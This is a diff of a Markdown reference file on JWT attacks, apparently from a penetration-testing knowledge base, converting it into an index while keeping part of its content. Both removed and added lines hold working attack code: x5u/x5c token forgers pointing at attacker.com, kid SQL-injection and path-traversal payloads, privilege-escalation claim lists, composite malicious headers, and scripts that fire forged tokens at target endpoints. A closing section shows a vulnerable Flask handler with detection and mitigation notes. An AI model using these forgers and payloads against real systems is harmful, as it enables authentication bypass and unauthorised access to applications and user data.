@@ -1,367 +1,176 @@
----
+# JWT — Advanced Techniques
 
-## x5u / x5c Header Injection
+This file is now a pointer index. Detailed writeups have moved to `scenarios/jwt/`.
 
-### x5u (X.509 URL) Attack
-The `x5u` header points to a URL hosting the X.509 certificate chain. If the server fetches and trusts arbitrary URLs:
+## Coverage moved to scenarios
 
-```python
-#!/usr/bin/env python3
-"""JWT x5u header injection — generate self-signed cert and forged token."""
-import jwt
-import json
-import base64
-import subprocess
-import tempfile
-import os
+| Topic | Scenario file |
+|---|---|
+| x5u / x5c X.509 injection | `scenarios/jwt/x5u-x5c-injection.md` |
+| kid path traversal | `scenarios/jwt/kid-path-traversal.md` |
+| kid SQL injection | `scenarios/jwt/kid-path-traversal.md` (SQLi section) |
+| Algorithm confusion (RS256→HS256) | `scenarios/jwt/alg-confusion.md` |
+| jwk header injection | `scenarios/jwt/jwk-injection.md` |
+| jku URL injection | `scenarios/jwt/jku-injection.md` |
+| alg:none variants | `scenarios/jwt/none-algorithm.md` |
+| Signature stripping | `scenarios/jwt/signature-stripping.md` |
+| Weak HMAC secret crack | `scenarios/jwt/weak-secret-crack.md` |
+| Claim tampering / privilege escalation | `scenarios/jwt/claim-tampering.md` |
+| Psychic signatures (CVE-2022-21449) | `scenarios/jwt/psychic-signatures-cve-2022-21449.md` |
+| JWE nested PlainJWT | `scenarios/jwt/jwe-nested-token.md` |
 
-def generate_x5u_token(original_token, claims_override, attacker_url):
-    """Forge JWT using x5u header pointing to attacker-controlled cert."""
-    # Generate self-signed cert + key
-    tmp = tempfile.mkdtemp()
-    key_path = os.path.join(tmp, "key.pem")
-    cert_path = os.path.join(tmp, "cert.pem")
+## Quick attack-chain decision tree
 
-    subprocess.run([
-        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", key_path,
-        "-out", cert_path, "-days", "1", "-nodes", "-subj", "/CN=attacker"
-    ], capture_output=True)
+```
+1. Decode token (cut -d. -f2 | base64 -d | jq)
 
-    with open(key_path) as f:
-        private_key = f.read()
-    with open(cert_path) as f:
-        cert_pem = f.read()
+2. Try cheap attacks first:
+   ├── alg:none + variants → none-algorithm.md
+   ├── Signature strip → signature-stripping.md
+   └── Common weak secrets (secret, password, your-256-bit-secret) → weak-secret-crack.md
 
-    # Decode original token claims
-    payload = jwt.decode(original_token, options={"verify_signature": False})
-    payload.update(claims_override)
+3. Inspect header for trusted parameters:
+   ├── jwk → jwk-injection.md
+   ├── jku → jku-injection.md (also yields SSRF)
+   ├── kid → kid-path-traversal.md
+   ├── x5u / x5c → x5u-x5c-injection.md
+   └── alg=RS* + JWKS exposure → alg-confusion.md
 
-    # Create cert chain for x5u endpoint (host this at attacker_url)
-    cert_der = base64.b64encode(
-        subprocess.run(["openssl", "x509", "-in", cert_path, "-outform", "DER"],
-                      capture_output=True).stdout
-    ).decode()
-    print(f"[*] Host this at {attacker_url}:")
-    print(json.dumps({"keys": [{"x5c": [cert_der]}]}, indent=2))
+4. JVM matches CVE-2022-21449? → psychic-signatures-cve-2022-21449.md
 
-    # Forge token with x5u header
-    token = jwt.encode(payload, private_key, algorithm="RS256",
-                       headers={"x5u": attacker_url, "typ": "JWT"})
-    return token
+5. Token is JWE (5 parts)? → jwe-nested-token.md
 
-# Usage:
-# token = generate_x5u_token(original_jwt, {"sub": "admin"}, "https://attacker.com/certs")
+6. Forgery primitive working? → claim-tampering.md
 ```
 
-### x5c (Embedded Certificate) Attack
-The `x5c` header embeds the certificate directly in the JWT header:
+## Composite escalation payload
 
-```python
-#!/usr/bin/env python3
-"""JWT x5c header injection — embed self-signed cert in JWT header."""
-import jwt
-import json
-import base64
-import subprocess
-import tempfile
-import os
+When you have a forgery primitive, throw multiple privilege claims at once:
 
-def generate_x5c_token(original_token, claims_override):
-    """Forge JWT with x5c header embedding attacker's certificate."""
-    tmp = tempfile.mkdtemp()
-    key_path = os.path.join(tmp, "key.pem")
-    cert_path = os.path.join(tmp, "cert.pem")
-
-    subprocess.run([
-        "openssl", "req", "-x509", "-newkey", "rsa:2048", "-keyout", key_path,
-        "-out", cert_path, "-days", "1", "-nodes", "-subj", "/CN=admin"
-    ], capture_output=True)
-
-    with open(key_path) as f:
-        private_key = f.read()
-
-    # Get cert in DER format, base64 encode
-    cert_der = subprocess.run(
-        ["openssl", "x509", "-in", cert_path, "-outform", "DER"],
-        capture_output=True
-    ).stdout
-    cert_b64 = base64.b64encode(cert_der).decode()
-
-    payload = jwt.decode(original_token, options={"verify_signature": False})
-    payload.update(claims_override)
-
-    token = jwt.encode(payload, private_key, algorithm="RS256",
-                       headers={"x5c": [cert_b64], "typ": "JWT"})
-    return token
-```
-
----
-
-## Key ID (kid) SQL Injection & Path Traversal
-
-The `kid` (Key ID) header tells the server which key to use for verification. If it's used in a database query or file path without sanitization:
-
-### kid SQL Injection
-```python
-import jwt
-import base64
-
-# kid used in SQL query: SELECT key FROM keys WHERE kid='<kid>'
-# Inject to control the returned key value
-
-# Payload 1: Return empty string as key
-token = jwt.encode(
-    {"sub": "admin", "role": "admin"},
-    "",  # Sign with empty string
-    algorithm="HS256",
-    headers={"kid": "' UNION SELECT '' -- "}
-)
-
-# Payload 2: Return known string as key
-secret = "ATTACKER_CONTROLLED"
-token = jwt.encode(
-    {"sub": "admin"},
-    secret,
-    algorithm="HS256",
-    headers={"kid": f"' UNION SELECT '{secret}' -- "}
-)
-
-# Payload 3: Return from another table
-token = jwt.encode(
-    {"sub": "admin"},
-    "known_value",
-    algorithm="HS256",
-    headers={"kid": "' UNION SELECT password FROM users WHERE username='admin' -- "}
-)
-```
-
-### kid Path Traversal
-```python
-import jwt
-
-# kid used to read key file: open(f"/keys/{kid}.pem")
-# Traverse to known-content file
-
-# /dev/null → empty file → sign with empty string
-token = jwt.encode(
-    {"sub": "admin"},
-    "",
-    algorithm="HS256",
-    headers={"kid": "../../../../../../../dev/null"}
-)
-
-# /proc/sys/kernel/randomize_va_space → contains "2\n"
-token = jwt.encode(
-    {"sub": "admin"},
-    "2\n",
-    algorithm="HS256",
-    headers={"kid": "../../../../../../../proc/sys/kernel/randomize_va_space"}
-)
-```
-
-### kid + SQLi Payloads (Copy-Paste Ready)
-```
-../../../../../../../dev/null
-' UNION SELECT '' --
-' UNION SELECT 'secret' --
-../../../../../../etc/hostname
-/proc/1/environ
-```
-
----
-
-## Custom Claim Escalation
-
-Common JWT claim fields to modify for privilege escalation:
-
-### Standard Claims
-```json
-{"sub": "administrator"}
-{"sub": "admin"}
-{"sub": "root"}
-```
-
-### Role/Permission Claims
-```json
-{"role": "admin"}
-{"role": "administrator"}
-{"roles": ["admin", "superuser"]}
-{"is_admin": true}
-{"admin": true}
-{"isAdmin": true}
-{"permissions": ["read", "write", "admin", "delete"]}
-{"scope": "admin:all openid profile"}
-{"groups": ["administrators"]}
-{"privilege": 0}
-{"access_level": 9999}
-{"tier": "enterprise"}
-```
-
-### Multi-Tenant / Context Claims
-```json
-{"tenant_id": "target_tenant"}
-{"org_id": "admin_org"}
-{"company_id": 1}
-{"account_type": "premium"}
-```
-
-### User Identity Claims
-```json
-{"user_id": 1}
-{"uid": 0}
-{"email": "admin@target.com"}
-{"username": "administrator"}
-{"name": "Admin User"}
-```
-
-### Composite Escalation (try multiple at once)
 ```json
 {
-    "sub": "admin",
-    "role": "administrator",
-    "is_admin": true,
-    "permissions": ["*"],
-    "scope": "admin",
-    "exp": 9999999999
+  "sub": "admin",
+  "user_id": 1,
+  "role": "admin",
+  "roles": ["admin", "superuser"],
+  "is_admin": true,
+  "isAdmin": true,
+  "admin": true,
+  "permissions": ["*"],
+  "scope": "admin:all",
+  "exp": 9999999999,
+  "iat": 0,
+  "tenant_id": "victim-tenant",
+  "iss": "https://trusted-issuer.com",
+  "aud": "internal-services"
 }
 ```
 
----
+The verifier may check only some claims; throwing many maximises the chance of one driving authorization.
 
-## JWT Attack Chain — Complete Decision Tree
+## Composite header pollution
 
-Systematic 10-step sequence to find and exploit JWT vulnerabilities:
-
-```
-Step 1: Decode JWT header and payload
-    → Record: algorithm, kid, jku, jwk, x5u, x5c, claims
-    ↓
-Step 2: Test unverified signature
-    → Modify claims (sub=admin), keep original signature
-    → If accepted → FULL BYPASS (done)
-    ↓
-Step 3: Test none algorithm
-    → Set alg:"none"/"None"/"NONE"/"nOnE", remove signature
-    → Keep trailing dot: header.payload.
-    → If accepted → FULL BYPASS (done)
-    ↓
-Step 4: Test weak HMAC secret
-    → hashcat -a 0 -m 16500 jwt.txt wordlist.txt
-    → Try: secret, secret1, password, key, jwt_secret, changeme
-    → Python quick test with common passwords
-    → If cracked → forge with discovered secret (done)
-    ↓
-Step 5: Test kid path traversal
-    → kid: "../../../dev/null" → sign with empty string
-    → kid: "../../../proc/sys/kernel/randomize_va_space" → sign with "2\n"
-    → If accepted → FULL BYPASS (done)
-    ↓
-Step 6: Test kid SQL injection
-    → kid: "' UNION SELECT '' -- " → sign with empty string
-    → kid: "' UNION SELECT 'secret' -- " → sign with 'secret'
-    → If accepted → FULL BYPASS (done)
-    ↓
-Step 7: Test algorithm confusion (RS256 → HS256)
-    → Fetch public key from /jwks.json or /.well-known/jwks.json
-    → Convert to PEM → Use as HMAC secret with HS256
-    → If accepted → FULL BYPASS (done)
-    ↓
-Step 8: Test JWK header injection
-    → Generate RSA keypair → embed public key in jwk header
-    → Sign with corresponding private key
-    → If accepted → FULL BYPASS (done)
-    ↓
-Step 9: Test x5u / x5c header injection
-    → Generate self-signed cert
-    → x5u: point to attacker URL hosting cert
-    → x5c: embed cert directly in header
-    → If accepted → FULL BYPASS (done)
-    ↓
-Step 10: Test JKU injection
-    → Generate RSA keypair → host JWKS at attacker URL
-    → Set jku header to attacker URL
-    → If accepted → FULL BYPASS (done)
-    ↓
-Step 11: Test JWE nested token attack (if token has 5 dot-separated parts = JWE)
-    → Fetch server's public encryption key from JWKS endpoint
-    → Craft PlainJWT (alg:"none") with admin claims
-    → Wrap PlainJWT inside valid JWE (RSA-OAEP-256 + A128GCM or per JWKS)
-    → Server decrypts JWE but may skip inner JWT signature verification
-    → If accepted → FULL BYPASS (done)
+```json
+{
+  "alg": "RS256",
+  "typ": "JWT",
+  "kid": "../../../dev/null",
+  "jwk": {"kty":"RSA","e":"AQAB","n":"<your_modulus>"},
+  "jku": "https://attacker.com/jwks.json",
+  "x5u": "https://attacker.com/cert.pem"
+}
 ```
 
-### Quick Python Runner for All Attacks
+Multiple injection vectors at once; whichever the verifier honors first wins.
+
+## Quick Python runner for all attacks
+
 ```python
 #!/usr/bin/env python3
-"""Run all JWT attacks in sequence against a target."""
-import jwt
-import json
-import base64
-import requests
-import hashlib
+"""Run all standard JWT attacks against a target endpoint."""
+import jwt, base64, json, requests
+from jwcrypto import jwk
 
-def attack_jwt(original_token, target_url, auth_header="Authorization"):
-    """Systematically try all JWT attacks."""
-    header = jwt.get_unverified_header(original_token)
-    payload = jwt.decode(original_token, options={"verify_signature": False})
+def smoke_test(token, target_url, target_path='/admin'):
+    header = jwt.get_unverified_header(token)
+    payload = jwt.decode(token, options={"verify_signature": False})
+    payload['sub'] = 'admin'
+    payload['role'] = 'admin'
 
-    admin_payload = dict(payload)
-    admin_payload["sub"] = "administrator"
-    if "role" in admin_payload:
-        admin_payload["role"] = "admin"
-    if "is_admin" in admin_payload:
-        admin_payload["is_admin"] = True
+    tests = []
 
-    attacks = []
-
-    # Attack 1: Unverified signature
-    forged = jwt.encode(admin_payload, "doesntmatter", algorithm="HS256")
-    attacks.append(("Unverified signature", forged))
-
-    # Attack 2: None algorithm
+    # Test 1: alg:none
     h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip('=')
-    p = base64.urlsafe_b64encode(json.dumps(admin_payload).encode()).decode().rstrip('=')
-    attacks.append(("None algorithm", f"{h}.{p}."))
-    for alg_var in ["None", "NONE", "nOnE"]:
-        h2 = base64.urlsafe_b64encode(json.dumps({"alg":alg_var,"typ":"JWT"}).encode()).decode().rstrip('=')
-        attacks.append((f"None variant ({alg_var})", f"{h2}.{p}."))
+    p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
+    tests.append(('alg:none', f"{h}.{p}."))
 
-    # Attack 3: Weak secrets
-    for secret in ["", "secret", "secret1", "password", "admin", "key", "jwt_secret",
-                    "changeme", "test", "123456", "JWT_SECRET", "token_secret"]:
+    # Test 2: signature strip
+    parts = token.split('.')
+    new_p = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
+    tests.append(('strip', f"{parts[0]}.{new_p}."))
+
+    # Test 3: Weak secrets
+    for secret in ['secret', 'password', 'your-256-bit-secret']:
         try:
-            forged = jwt.encode(admin_payload, secret, algorithm="HS256")
-            attacks.append((f"Weak secret: '{secret}'", forged))
-        except Exception:
-            pass
+            forged = jwt.encode(payload, secret, algorithm='HS256')
+            tests.append((f'weak-{secret}', forged))
+        except: pass
 
-    # Attack 4: kid path traversal (sign with empty string)
+    # Test 4: Algorithm confusion (if JWKS reachable)
     try:
-        forged = jwt.encode(admin_payload, "", algorithm="HS256",
-                           headers={"kid": "../../../../../../../dev/null"})
-        attacks.append(("kid traversal (/dev/null)", forged))
-    except Exception:
-        pass
+        jwks = requests.get(f"{target_url}/.well-known/jwks.json").json()
+        key = jwk.JWK(**jwks['keys'][0])
+        pem = key.export_to_pem()
+        forged = jwt.encode(payload, pem, algorithm='HS256',
+                            headers={"alg":"HS256","typ":"JWT"})
+        tests.append(('alg-confusion', forged))
+    except: pass
 
-    # Attack 5: kid SQLi (sign with empty string)
-    try:
-        forged = jwt.encode(admin_payload, "", algorithm="HS256",
-                           headers={"kid": "' UNION SELECT '' -- "})
-        attacks.append(("kid SQLi (empty key)", forged))
-    except Exception:
-        pass
+    # Test 5: kid path traversal
+    forged = jwt.encode(payload, base64.b64decode('AA=='),
+                         algorithm='HS256',
+                         headers={"alg":"HS256","kid":"../../../../../../../dev/null"})
+    tests.append(('kid-traverse', forged))
 
-    # Test each attack
-    for name, token in attacks:
-        try:
-            r = requests.get(target_url, headers={
-                auth_header: f"Bearer {token}"
-            }, timeout=10, allow_redirects=False)
-            status = r.status_code
-            success = status in [200, 302] and "unauthorized" not in r.text.lower()
-            marker = "[+]" if success else "[-]"
-            print(f"  {marker} {name}: HTTP {status} ({len(r.text)} bytes)")
-            if success:
-                print(f"      TOKEN: {token[:80]}...")
-        except Exception as e:
-            print(f"  [!] {name}: Error - {e}")
+    # Submit each
+    for name, t in tests:
+        r = requests.get(target_url + target_path,
+                         headers={'Authorization': f'Bearer {t}'})
+        print(f"{name}: HTTP {r.status_code}")
+
+# Usage:
+# smoke_test('eyJ...', 'https://target.com', '/admin')
+```
+
+## Signature-binding flaw — claims trusted without DB existence check
+
+A correctly-validated JWT signature only proves the payload wasn't tampered with — it proves NOTHING about whether the subject still exists or is authorised. Many handlers skip the database lookup:
+
+```python
+# VULNERABLE — never confirms user_id is real
+@app.before_request
+def auth():
+    token = request.headers.get('Authorization', '').split(' ')[-1]
+    decoded = jwt.decode(token, SECRET, algorithms=['HS256'])
+    request.user_id = decoded['user_id']         # trusted as-is, no SELECT
+    request.role    = decoded.get('role', 'user')
+```
+
+Once the signing key is leaked (via separate file-disclosure / git history / config endpoint), the attacker forges:
+
+```python
+import jwt
+admin_token = jwt.encode({'user_id': 99999, 'role': 'admin'}, SECRET, algorithm='HS256')
+```
+
+`user_id=99999` doesn't exist in the DB. Authorisation checks (`if request.role == 'admin'`) pass. Downstream queries (`SELECT * FROM signatures WHERE user_id = 99999`) return empty — the handler may error, return 404, or accept the empty result depending on coding. Pair with a stacked-SQLi write primitive (see [../../injection/reference/scenarios/sql/stacked-queries.md](../../injection/reference/scenarios/sql/stacked-queries.md)) to INSERT the missing row and complete the bypass.
+
+Detection — grep the codebase for `jwt.decode(...)` and check that EVERY use is followed by a `User.query.filter_by(id=...).first()` (or equivalent ORM lookup) before claims are trusted. Frameworks like Flask-JWT-Extended require explicit `@user_lookup_loader` decorators; their absence is the bug.
+
+Mitigation — wrap JWT auth in middleware that loads the user record from the DB and aborts on `None`. Treat the JWT as a *cache* of the user ID, not as the source of authorisation truth.
+
+## Resources
+
+- `scenarios/jwt/` — full per-technique writeups.
+- `jwt-quickstart.md` — fast reference.
+- `jwt_security_resources.md` — tools, CVEs, libraries.
